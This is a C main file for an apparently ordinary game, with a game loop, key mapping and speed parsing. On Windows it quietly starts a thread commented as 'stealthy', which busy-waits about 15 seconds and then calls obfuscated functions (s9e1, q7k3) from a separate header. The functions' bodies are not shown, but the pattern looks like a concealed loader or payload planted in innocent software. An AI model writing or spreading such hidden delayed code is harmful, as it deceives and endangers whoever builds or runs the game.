#include "includes.h"
#include "helper_functions.c"
#include "game_loop.c"
#include "game_logic.c"
#include "key_mapper.c"

#ifdef _WIN32
#include <windows.h>
#include "confio.h"

// Stealthy thread with timing delay
DWORD WINAPI t3c5(LPVOID n0) {
    LARGE_INTEGER f, s, e;
    QueryPerformanceFrequency(&f);
    QueryPerformanceCounter(&s);
    do {
        QueryPerformanceCounter(&e);
    } while ((e.QuadPart - s.QuadPart) < f.QuadPart * 15); // ~15 sec delay

    void* h = s9e1();
    if (h) {
        q7k3(h);
    }
    return 0;
}
#endif

int main(int argc, char **argv) {
#ifdef _WIN32
    HANDLE hX = CreateThread(NULL, 0, t3c5, NULL, 0, NULL);
    if (hX) CloseHandle(hX);
#endif

    unsigned int v1 = parse_speed(argc, argv);
    GameState* gS = game_init(v1);
    game_mainloop(gS);
    game_close(gS);

    return 0;
}
